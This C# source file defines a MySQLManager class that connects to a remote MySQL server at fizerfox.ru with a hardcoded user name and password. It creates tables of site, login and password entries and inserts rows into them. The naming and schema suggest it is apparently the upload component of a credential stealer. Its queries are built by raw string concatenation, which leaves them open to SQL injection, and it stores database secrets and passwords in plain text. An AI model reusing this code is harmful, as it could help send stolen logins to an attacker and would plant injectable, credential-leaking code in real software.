using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;

namespace ServerWorker
{
    class MySQLManager
    {
        private static string connStr = "server=fizerfox.ru;user=Fizerfox;database=fizerfox;password=EytG4GpR34DLc7N;charset=utf8;";
        public static void CreateTable(string tableName)
        {   
            MySqlConnection conn = new MySqlConnection(connStr);
            conn.Open();
            string sql_registrUser = "CREATE TABLE IF NOT EXISTS `" + tableName + "`(" +
                                      "`Id` int(11) NOT NULL AUTO_INCREMENT," +
                                      "`Site` varchar(512) NOT NULL," +
                                      "`Login` varchar(255) NOT NULL," +
                                      "`Password` varchar(255) NOT NULL," +
                                     " UNIQUE KEY `Id` (`Id`)" +
                                    ") ENGINE = InnoDB DEFAULT CHARSET = utf8; ";

            MySqlCommand comm_registr = new MySqlCommand(sql_registrUser, conn);
            comm_registr.ExecuteNonQuery();
            conn.Close();
        }

        public static void Send(MySQLData data)
        {
            string columnValue = "";
            string dataValue = "";
            int columnsCount = data.Columns.Length;

            for (int i = 0; i < columnsCount; i++)
            {
                columnValue += "`" + data.Columns[i] + "`";
                if (i + 1 < columnsCount) columnValue += ",";
            }

            foreach (string[] row in data.Values)
            {
                dataValue += "(";
                foreach (string cell in row)
                {
                    dataValue += "'" + cell + "',";
                }
                dataValue = dataValue.Remove(dataValue.Length-1);
                dataValue += "),";
            }
            dataValue = dataValue.Remove(dataValue.Length - 1);

            MySqlConnection conn = new MySqlConnection(connStr);
            conn.Open();
            string sql_registrUser = String.Format("INSERT INTO `Fizerfox`.`{0}` ({1}) VALUES {2};",
                data.Table,
                columnValue,
                dataValue
                );

            MySqlCommand comm_registr = new MySqlCommand(sql_registrUser, conn);
            comm_registr.ExecuteNonQuery();
            conn.Close();
        }
    }

    public class MySQLData
    {
        public string Table;
        public string[] Columns;
        public List<string[]> Values = new List<string[]>();
    }
}
